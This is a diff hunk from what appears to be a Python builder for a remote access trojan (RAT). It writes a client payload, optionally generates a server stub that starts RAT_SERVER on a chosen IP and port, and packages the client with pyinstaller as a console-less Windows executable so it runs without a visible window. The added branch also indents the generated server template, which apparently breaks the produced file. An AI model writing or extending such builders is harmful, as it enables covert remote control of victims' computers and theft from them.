@@ -178,18 +178,22 @@ if __name__ == '__main__':
         client.write(clientcontent)
     print("client created")
     client.close()
-    print("creating server...")
-    server=open(f"temp\server.py","a")
-    servercontent=f"""
-rat = RAT_SERVER('{ip}', {port})
+    if randomizer==True:
+        print("server not created")
+        print("port randomizer on")
+    else:
+        print("creating server...")
+        server=open(f"temp\server.py","a")
+        servercontent=f"""
+    rat = RAT_SERVER('{ip}', {port})
 
-if __name__ == '__main__':
-    rat.build_connection()
-    rat.execute()
-    """
-    server.write(servercontent)
-    server.close()
-    print("server created")
+    if __name__ == '__main__':
+        rat.build_connection()
+        rat.execute()
+        """
+        server.write(servercontent)
+        server.close()
+        print("server created")
     print("transforming to .exe ...")
     os.system("pyinstaller --onefile --noconsole --i=NONE temp\client.py")
     print("transformed .exe!")
